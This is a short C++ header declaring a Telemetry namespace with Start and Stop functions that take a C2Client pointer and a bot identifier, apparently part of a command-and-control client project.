/*
MIT License
Copyright (c) 2020 4B4DB4B3
*/
#pragma once
#ifndef TELEMETRY_H
#define TELEMETRY_H

class C2Client;

namespace Telemetry {
    // Start background monitoring thread. Must be called after C2Client is ready.
    void Start(C2Client* api, int bot_id);
    void Stop();
}

#endif
